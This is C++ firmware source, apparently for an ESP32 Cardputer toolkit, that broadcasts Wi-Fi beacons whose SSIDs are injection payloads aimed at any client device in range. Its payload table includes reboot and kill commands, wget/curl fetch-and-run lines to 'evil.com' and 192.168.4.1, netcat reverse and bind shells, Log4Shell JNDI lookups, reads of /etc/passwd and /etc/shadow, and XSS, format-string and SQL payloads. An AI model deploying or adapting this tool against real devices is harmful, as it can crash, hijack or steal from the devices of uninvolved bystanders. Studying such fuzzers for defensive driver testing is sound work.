/*
 * wifi_ciw — CIW Zeroclick SSID injection testing framework.
 *
 * Ported from Evil-M5Project (Evil-Cardputer v1.5.2) into POSEIDON style.
 *
 * Broadcasts beacon frames with SSID payloads targeting driver
 * vulnerabilities: command injection, buffer overflow, format string,
 * Log4Shell JNDI, XSS, CRLF, path traversal, heap spray, etc.
 *
 * 14 payload categories, ~157 payloads. Rotates SSID on a configurable
 * interval. Monitors for fast disconnects as potential crash indicators.
 */
#include "app.h"
#include "../theme.h"
#include "ui.h"
#include "input.h"
#include "radio.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_netif.h>
#include <esp_heap_caps.h>
#include "../heap_budget.h"
#include <esp_event.h>
#include <esp_bt.h>
#include <esp_log.h>

/* ── Payload categories ───────────────────────────────────────────── */
enum CiwCat : uint8_t {
    CIW_CMD=0, CIW_OVERFLOW, CIW_FMT, CIW_PROBE, CIW_ESC, CIW_SERIAL,
    CIW_ENC, CIW_CHAIN, CIW_HEAP, CIW_XSS, CIW_PATH, CIW_CRLF,
    CIW_JNDI, CIW_NOSQL, CIW_CAT_COUNT
};

static const char *const s_cat_names[] = {
    "CMD","OVFL","FMT","PROBE","ESC","SERIAL",
    "ENC","CHAIN","HEAP","XSS","PATH","CRLF",
    "JNDI","NoSQL"
};

struct CiwPayload {
    /* POS-AUDIT-209 INTENTIONAL: kept at 64 — 802.11 max SSID is 32
     * (+1 NUL) but CIW is specifically about feeding oversized payloads
     * to test client / driver bounds checking. One existing entry is a
     * 33-char 'A' string targeting the off-by-one. Shrinking the field
     * to 33 would silently truncate fuzz vectors. ~2.3 KB BSS savings
     * is not worth dropping the fuzz capability. */
    char     ssid[64];
    uint8_t  cat;
};

/* ── Hardcoded payload table (in flash) ───────────────────────────── */
#define P(s, c) { s, c }
static const CiwPayload PAYLOADS[] PROGMEM = {
    /* wifi_cmd (25) */
    P("|reboot|", CIW_CMD), P("&reboot&", CIW_CMD), P("`reboot`", CIW_CMD),
    P("$reboot$", CIW_CMD), P(";reboot;", CIW_CMD), P("$(reboot)", CIW_CMD),
    P("|shutdown -r|", CIW_CMD), P("&cat /etc/passwd", CIW_CMD),
    P("reboot\\nreboot", CIW_CMD), P("reboot\\r\\nreboot", CIW_CMD),
    P("|../../bin/sh|", CIW_CMD), P("${IFS}reboot", CIW_CMD),
    P("*;reboot", CIW_CMD), P("$(echo reboot|sh)", CIW_CMD),
    P("reboot\\x00ignored", CIW_CMD), P("|nc -lp 4444 -e sh|", CIW_CMD),
    P("&wget evil.com/x&", CIW_CMD), P("$(curl evil.com)", CIW_CMD),
    P("|id>/tmp/pwn|", CIW_CMD), P("\\x00|reboot|", CIW_CMD),
    P("& ping -n 3 127.0.0.1 &", CIW_CMD), P("|powershell -c reboot|", CIW_CMD),
    P("`busybox reboot`", CIW_CMD), P("$(kill -9 1)", CIW_CMD),
    P("|/bin/busybox telnetd|", CIW_CMD),

    /* wifi_overflow (26) */
    P("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", CIW_OVERFLOW),
    P("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", CIW_OVERFLOW),  /* 33-byte off-by-one */
    P("%s%s%s%sAAAAAAAAAAAAAAAAAAAAAAAA", CIW_OVERFLOW),
    P("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%n", CIW_OVERFLOW),
    P("", CIW_OVERFLOW),  /* empty SSID */
    P(" ", CIW_OVERFLOW),  /* single space */
    P("A", CIW_OVERFLOW),  /* single byte */
    P("ABCDEFGHIJKLMNOPQRSTUVWXYZ123456", CIW_OVERFLOW), /* 32-byte sequential */

    /* wifi_fmt (15) */
    P("%s%s%s%s%s", CIW_FMT), P("%n%n%n%n", CIW_FMT),
    P("%x%x%x%x", CIW_FMT), P("%p%p%p%p", CIW_FMT),
    P("%d%d%d%d%d%d", CIW_FMT), P("AAAA%08x%08x%08x", CIW_FMT),
    P("%s%s%s%s%s%s%s%s%s%s", CIW_FMT), P("%08x.%08x.%08x.%08x", CIW_FMT),
    P("%n%n%n%n%n%n%n%n", CIW_FMT), P("%hn%hn%hn%hn", CIW_FMT),
    P("%1$s%2$s%3$s", CIW_FMT), P("%1$n%2$n", CIW_FMT),
    P("%.9999d", CIW_FMT),

    /* wifi_probe (14) */
    P("", CIW_PROBE), P(" ", CIW_PROBE),
    P("ValidSSID\\xff", CIW_PROBE), P("Test\\x00Hidden", CIW_PROBE),
    P("DIRECT-xx-SPOOF", CIW_PROBE),

    /* wifi_esc (8) */
    P("\\x1b[2J\\x1b[H", CIW_ESC), P("\\x1b]0;HACKED\\x07", CIW_ESC),
    P("\\x1b[6n", CIW_ESC), P("\\x1b[?47h", CIW_ESC),
    P("\\x1b[31mERROR\\x1b[0m", CIW_ESC), P("\\x1b[1A\\x1b[2K", CIW_ESC),
    P("\\x1b[32mroot@srv\\x1b[0m", CIW_ESC), P("\\x1b[8m", CIW_ESC),

    /* wifi_serial (13) */
    P("\",\"admin\":true,\"x\":\"", CIW_SERIAL),
    P("</name><admin>1</admin>", CIW_SERIAL),
    P("'; DROP TABLE wifi;--", CIW_SERIAL),
    P("{\"role\":\"admin\"}", CIW_SERIAL),
    P("key=val\\nnewsection", CIW_SERIAL),
    P("{{7*7}}", CIW_SERIAL), P("<%= system('id') %>", CIW_SERIAL),
    P("${7*7}", CIW_SERIAL), P("=CMD(\"calc\")", CIW_SERIAL),

    /* wifi_enc (8) */
    P("%7Creboot%7C", CIW_ENC), P("%24(reboot)", CIW_ENC),
    P("&vert;reboot&vert;", CIW_ENC),

    /* wifi_chain (8) */
    P("$(", CIW_CHAIN), P("reboot)", CIW_CHAIN),
    P("|nc 192.168.4.1", CIW_CHAIN), P("4444 -e /bin/sh|", CIW_CHAIN),
    P("%x%x%x%x_LEAK", CIW_CHAIN), P("%n%n_WRITE", CIW_CHAIN),
    P("wget http://192.168", CIW_CHAIN), P(".4.1/x -O-|sh", CIW_CHAIN),

    /* wifi_heap (8) */
    P("\\xde\\xad\\xbe\\xef", CIW_HEAP), P("\\xba\\xad\\xf0\\x0d", CIW_HEAP),

    /* wifi_xss (8) */
    P("<script>alert(1)</script>", CIW_XSS),
    P("<img src=x onerror=alert(1)>", CIW_XSS),
    P("<svg onload=alert(1)>", CIW_XSS),
    P("<body onload=alert(1)>", CIW_XSS),
    P("<details open ontoggle=alert(1)>", CIW_XSS),
    P("<iframe src=javascript:alert(1)>", CIW_XSS),
    P("';alert(1)//", CIW_XSS),
    P("<marquee onstart=alert(1)>", CIW_XSS),

    /* wifi_path (6) */
    P("../../../etc/shadow", CIW_PATH),
    P("..\\\\..\\\\..\\\\etc\\\\shadow", CIW_PATH),
    P("/proc/self/environ", CIW_PATH),
    P("/dev/urandom", CIW_PATH),

    /* wifi_crlf (6) */
    P("\\r\\nX-Injected: true", CIW_CRLF),
    P("\\r\\nLocation: http://evil", CIW_CRLF),
    P("\\r\\n\\r\\n<html>injected", CIW_CRLF),

    /* wifi_jndi (6) */
    P("${jndi:ldap://evil/x}", CIW_JNDI),
    P("${jndi:dns://evil/x}", CIW_JNDI),
    P("${env:AWS_SECRET}", CIW_JNDI),
    P("${sys:java.version}", CIW_JNDI),
    P("${jndi:rmi://evil/x}", CIW_JNDI),
    P("${${lower:j}ndi:ldap://x}", CIW_JNDI),

    /* wifi_nosql (6) */
    P("admin' || '1'=='1", CIW_NOSQL),
    P("{\"$ne\":1}", CIW_NOSQL),
    P("{\"$regex\":\".*\"}", CIW_NOSQL),
    P("{\"$where\":\"sleep(5000)\"}", CIW_NOSQL),
    P("*)(objectClass=*)", CIW_NOSQL),
    P("admin)(!(&(1=0", CIW_NOSQL),
};
#undef P
#define PAYLOAD_COUNT (sizeof(PAYLOADS)/sizeof(PAYLOADS[0]))

/* ── Beacon frame template (raw 802.11) ───────────────────────────── */
static uint8_t s_beacon[128] = {
    0x80, 0x00, 0x00, 0x00,                         /* type: beacon */
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,             /* dst: broadcast */
    0,0,0,0,0,0,                                    /* src BSSID */
    0,0,0,0,0,0,                                    /* bssid */
    0x00, 0x00,                                     /* seq */
    0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, /* timestamp */
    0x64, 0x00,                                     /* beacon interval */
    0x31, 0x04,                                     /* capabilities */
    0x00,                                           /* SSID tag */
    0x00,                                           /* SSID length (filled) */
};

static int build_beacon(const char *ssid, uint8_t ch, uint8_t bssid[6])
{
    memcpy(s_beacon + 10, bssid, 6);
    memcpy(s_beacon + 16, bssid, 6);
    size_t ssid_len = strlen(ssid);
    if (ssid_len > 32) ssid_len = 32;
    s_beacon[37] = (uint8_t)ssid_len;
    memcpy(s_beacon + 38, ssid, ssid_len);

    uint8_t *p = s_beacon + 38 + ssid_len;
    /* Supported rates */
    *p++ = 0x01; *p++ = 0x08;
    *p++ = 0x82; *p++ = 0x84; *p++ = 0x8B; *p++ = 0x96;
    *p++ = 0x24; *p++ = 0x30; *p++ = 0x48; *p++ = 0x6C;
    /* DS parameter set */
    *p++ = 0x03; *p++ = 0x01; *p++ = ch;
    return (int)(p - s_beacon);
}

/* ── Category selection submenu ───────────────────────────────────── */
static uint16_t s_cat_mask = 0xFFFF; /* all enabled by default */

/* Count active payloads per category — so the picker can show the
 * operator that each entry has actual content, not appear "empty"
 * as the bug report described. Scans the PAYLOADS flash table once. */
static int category_payload_count(uint8_t cat)
{
    int n = 0;
    for (size_t i = 0; i < PAYLOAD_COUNT; ++i) {
        CiwPayload p;
        memcpy_P(&p, &PAYLOADS[i], sizeof(CiwPayload));
        if (p.cat == cat) n++;
    }
    return n;
}

/* #B5: drill-down viewer — list every payload string in one category.
 * Read-only; lets the operator confirm WHAT is actually broadcast.
 * Payloads can be up to 64 chars; truncated to fit the 240 px panel. */
static void view_category_payloads(uint8_t cat)
{
    int cursor = 0, first = 0;
    static const int VISIBLE_ROWS = 8;

    /* Build the index list of payloads in this category. */
    int idx[PAYLOAD_COUNT];
    int n = 0;
    for (size_t i = 0; i < PAYLOAD_COUNT; ++i) {
        CiwPayload p;
        memcpy_P(&p, &PAYLOADS[i], sizeof(CiwPayload));
        if (p.cat == cat) idx[n++] = (int)i;
    }

    bool redraw = true;
    while (true) {
        if (redraw) {
            ui_clear_body();
            ui_draw_footer(";/.=scroll  `=back");
            ui_text(4, BODY_Y+2, T_ACCENT, "%s  %d payloads",
                    s_cat_names[cat], n);
            if (cursor < first) first = cursor;
            if (cursor >= first + VISIBLE_ROWS) first = cursor - VISIBLE_ROWS + 1;
            for (int r = 0; r < VISIBLE_ROWS; ++r) {
                int li = first + r;
                if (li >= n) break;
                CiwPayload p;
                memcpy_P(&p, &PAYLOADS[idx[li]], sizeof(CiwPayload));
                uint16_t fg = (li == cursor) ? T_ACCENT : T_FG;
                /* Render empty / whitespace payloads visibly. */
                const char *disp = p.ssid;
                char tmp[40];
                if (p.ssid[0] == '\0')      disp = "<empty>";
                else if (p.ssid[0] == ' ' && p.ssid[1] == '\0') disp = "<space>";
                else { snprintf(tmp, sizeof(tmp), "%.37s", p.ssid); disp = tmp; }
                ui_text(4, BODY_Y + 14 + r*10, fg, "%s", disp);
            }
            if (first > 0)
                ui_text(SCR_W - 12, BODY_Y + 14, T_DIM, "^");
            if (first + VISIBLE_ROWS < n)
                ui_text(SCR_W - 12, BODY_Y + 14 + (VISIBLE_ROWS-1)*10, T_DIM, "v");
            redraw = false;
        }
        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(30); continue; }
        if (k == PK_ESC) return;
        if ((k == PK_UP || k == ';') && cursor > 0) { cursor--; redraw = true; }
        if ((k == PK_DOWN || k == '.') && cursor < n-1) { cursor++; redraw = true; }
    }
}

static void cat_select_menu(void)
{
    int cursor = 0;
    int first  = 0;
    /* 14 categories at 10 px row height in a ~90 px usable body —
     * window 8 at a time and let the cursor scroll the window. */
    static const int VISIBLE_ROWS = 8;
    bool redraw = true;
    while (true) {
        if (redraw) {
            ui_clear_body();
            ui_draw_footer(";/.move ENTER=toggle V=view `=done");
            ui_text(4, BODY_Y+2, T_ACCENT,
                    "PAYLOAD CATEGORIES  %d/%d",
                    cursor + 1, (int)CIW_CAT_COUNT);

            /* Keep cursor inside the window. */
            if (cursor < first) first = cursor;
            if (cursor >= first + VISIBLE_ROWS) first = cursor - VISIBLE_ROWS + 1;

            for (int r = 0; r < VISIBLE_ROWS; ++r) {
                int i = first + r;
                if (i >= CIW_CAT_COUNT) break;
                bool on = s_cat_mask & (1 << i);
                uint16_t fg = (i == cursor) ? T_ACCENT : (on ? T_FG : T_DIM);
                int pcount = category_payload_count(i);
                ui_text(4, BODY_Y + 14 + r*10, fg, "%c %-7s (%d)",
                         on ? '+' : '-', s_cat_names[i], pcount);
            }
            /* Scroll indicators so the user knows there's more. */
            if (first > 0)
                ui_text(SCR_W - 12, BODY_Y + 14, T_DIM, "^");
            if (first + VISIBLE_ROWS < CIW_CAT_COUNT)
                ui_text(SCR_W - 12, BODY_Y + 14 + (VISIBLE_ROWS-1)*10, T_DIM, "v");
            redraw = false;
        }

        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(30); continue; }
        if (k == PK_ESC) return;
        /* Accept both ;/. (Cardputer idiomatic) and PK_UP/PK_DOWN. */
        if ((k == PK_UP || k == ';') && cursor > 0) { cursor--; redraw = true; }
        if ((k == PK_DOWN || k == '.') && cursor < CIW_CAT_COUNT-1) { cursor++; redraw = true; }
        if (k == PK_ENTER) { s_cat_mask ^= (1 << cursor); redraw = true; }
        /* #B5: V drills into the highlighted category's payload list. */
        if (k == 'v' || k == 'V') { view_category_payloads(cursor); redraw = true; }
    }
}

/* ================================================================== *
 *  CIW ZEROCLICK MAIN                                                *
 * ================================================================== */
void feat_wifi_ciw(void)
{
    /* Lazy-allocate the payload buffer once, before any radio or UI side
     * effects, so an OOM bail leaves no state to unwind (~7 KB stays free
     * until this rarely-used feature is first entered). */
    static CiwPayload *active = nullptr;
    if (!active) {
        active = (CiwPayload *)heap_caps_calloc(PAYLOAD_COUNT, sizeof(CiwPayload),
                                                MALLOC_CAP_INTERNAL);
        if (!active) { ui_toast("Low memory", T_BAD, 1500); return; }
    }

    radio_switch(RADIO_WIFI);

    /* Category selection first */
    cat_select_menu();

    /* Build active payload list based on the selected mask. */
    int activeN = 0;
    for (size_t i = 0; i < PAYLOAD_COUNT; i++) {
        CiwPayload p;
        memcpy_P(&p, &PAYLOADS[i], sizeof(CiwPayload));
        if (s_cat_mask & (1 << p.cat)) {
            memcpy(&active[activeN++], &p, sizeof(CiwPayload));
        }
    }

    if (activeN == 0) {
        ui_toast("no payloads selected", T_WARN, 1500);
        return;
    }

    /* POS-AUDIT-003: Raw-IDF AP bring-up — Arduino WiFi.softAP path is
     * banned (ieee80211_hostap_attach +0x2c crash on pinned Bruce libs;
     * repeated softAP re-attach drives ESP_ERR_NO_MEM 257). Recipe
     * mirrors wifi_portal.cpp:417-481 (will share via wifi_raw_ap_up()
     * helper in Phase 2 / wifi-042).
     *
     * The AP is a vehicle for esp_wifi_80211_tx(WIFI_IF_AP) — the real
     * SSID rotation happens via raw beacon TX in the inner loop. We
     * keep the AP itself on a single static SSID and never re-call
     * softAP-equivalent during rotation. */
    esp_wifi_set_promiscuous(false);
    esp_wifi_stop();
    esp_wifi_deinit();
    delay(300);
    esp_netif_t *sta_if = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    if (sta_if) esp_netif_destroy_default_wifi(sta_if);

    /* POS-AUDIT-007 (revised after on-device repro 2026-06-06):
     * force-shutdown BT before mem_release. See wifi_portal.cpp
     * for full rationale. */
    bool bt_was_inited =
        (esp_bt_controller_get_status() != ESP_BT_CONTROLLER_STATUS_IDLE);
    if (bt_was_inited) {
        esp_bt_controller_disable();
        esp_bt_controller_deinit();
    }
    esp_bt_controller_mem_release(ESP_BT_MODE_BTDM);
    if (bt_was_inited) {
        ui_toast("BLE disabled until reboot", T_WARN, 1200);
    }

    esp_log_level_set("wifi",      ESP_LOG_INFO);
    esp_log_level_set("wifi_init", ESP_LOG_INFO);
    esp_netif_init();
    esp_event_loop_create_default();
    esp_netif_create_default_wifi_ap();

    wifi_init_config_t wcfg = WIFI_INIT_CONFIG_DEFAULT();
    /* Shrink TX/RX buffer pools to fit the ~115 KB internal SRAM left
     * after Cardputer + GFX claim their share — matches wifi_portal /
     * beacon_spam values that are verified to actually beacon. */
    wcfg.static_tx_buf_num  = 0;
    wcfg.dynamic_tx_buf_num = 16;
    wcfg.tx_buf_type        = 1;
    wcfg.cache_tx_buf_num   = 4;
    wcfg.static_rx_buf_num  = 4;
    wcfg.dynamic_rx_buf_num = 16;
    wcfg.ampdu_tx_enable    = 0;
    wcfg.ampdu_rx_enable    = 0;
    /* softAP path: reclaim caches and veto cleanly if heap is too fragmented. */
    if (!rf_preflight("wifi_ciw", 12288)) return;
    if (esp_wifi_init(&wcfg) != ESP_OK) {
        ui_toast("wifi_init fail", T_BAD, 1500);
        return;
    }
    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    esp_wifi_set_mode(WIFI_MODE_AP);

    wifi_config_t apc = {};
    /* Use a fixed, low-profile SSID for the vehicle AP. The CIW payloads
     * themselves are blasted only via raw beacon TX below. */
    const char *ap_ssid = "ciw";
    strncpy((char *)apc.ap.ssid, ap_ssid, sizeof(apc.ap.ssid) - 1);
    apc.ap.ssid_len        = strlen(ap_ssid);
    apc.ap.channel         = 1;
    apc.ap.authmode        = WIFI_AUTH_OPEN;
    apc.ap.max_connection  = 4;
    apc.ap.beacon_interval = 100;
    apc.ap.ssid_hidden     = 0;
    if (esp_wifi_set_config(WIFI_IF_AP, &apc) != ESP_OK ||
        esp_wifi_start() != ESP_OK) {
        ui_toast("wifi_start fail", T_BAD, 1500);
        esp_wifi_deinit();
        return;
    }
    /* Bug 11: max TX power so scanners pick up the fuzz beacons at
     * realistic range. 78 = 19.5 dBm. */
    esp_wifi_set_max_tx_power(84);
    /* Some builds ignore the channel in the config struct; force it. */
    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
    delay(50);

    /* Enable promiscuous for raw TX (esp_wifi_80211_tx contract). */
    esp_wifi_set_promiscuous(true);

    int idx = 0;
    uint32_t rotateInterval = 5000; /* 5s default */
    uint32_t lastRotate = millis();
    uint32_t alerts = 0;
    bool running = true;

    ui_clear_body();
    ui_draw_footer("+/-=speed  `=stop");
    ui_text(4, BODY_Y+2, T_ACCENT, "CIW ZEROCLICK");
    ui_text(4, BODY_Y+14, T_FG, "payloads: %d", activeN);

    uint32_t tUI = 0;
    while (running) {
        uint16_t k = input_poll();
        if (k == PK_ESC) break;
        if (k == '+' || k == '=') { if (rotateInterval > 1000) rotateInterval -= 1000; }
        if (k == '-' || k == '_') { rotateInterval += 1000; }

        /* Rotate SSID (raw beacon only — POS-AUDIT-003 dropped the
         * per-rotation WiFi.softAP() re-call that drove ESP_ERR_NO_MEM
         * 257 cascades). Scanners on nearby clients pick up the new
         * SSID off the broadcast beacon; the vehicle AP itself stays
         * pinned on "ciw" to avoid driver thrash. */
        if (millis() - lastRotate >= rotateInterval) {
            idx = (idx + 1) % activeN;
            lastRotate = millis();

            uint8_t bssid[6];
            bssid[0] = 0xDE; bssid[1] = 0xAD;
            bssid[2] = random(0,256); bssid[3] = random(0,256);
            bssid[4] = random(0,256); bssid[5] = random(0,256);
            int flen = build_beacon(active[idx].ssid, 1, bssid);
            esp_wifi_80211_tx(WIFI_IF_AP, s_beacon, flen, false);
        }

        /* UI update */
        if (millis() - tUI > 300) {
            tUI = millis();
            ui_text(4, BODY_Y+28, T_FG,    "[%d/%d] %s", idx+1, activeN,
                     s_cat_names[active[idx].cat]);
            /* Truncate SSID for display (240px ~= 38 chars at textSize 1) */
            char disp[34];
            strncpy(disp, active[idx].ssid, 33); disp[33] = '\0';
            ui_text(4, BODY_Y+40, T_ACCENT, "%.33s", disp);
            ui_text(4, BODY_Y+54, T_DIM,    "interval: %lums", (unsigned long)rotateInterval);
            ui_text(4, BODY_Y+66, alerts ? T_BAD : T_DIM,
                                             "alerts: %lu", (unsigned long)alerts);
            ui_draw_status(radio_name(), "ciw");
        }
        delay(10);
    }

    /* POS-AUDIT-003 teardown: raw-IDF stop+deinit matching the bring-up.
     * Previously the teardown ended in WiFi.mode(WIFI_MODE_APSTA) which
     * doubled WiFi buffers and corrupted the next radio user. radio.cpp
     * teardown(RADIO_WIFI) (POS-AUDIT-008 partial) drops only the assoc,
     * so we must explicitly stop+deinit here for the AP driver state.
     * radio_switch(RADIO_NONE) is the standard cap. */
    esp_wifi_set_promiscuous(false);
    esp_wifi_stop();
    esp_wifi_deinit();
    radio_switch(RADIO_NONE);
}
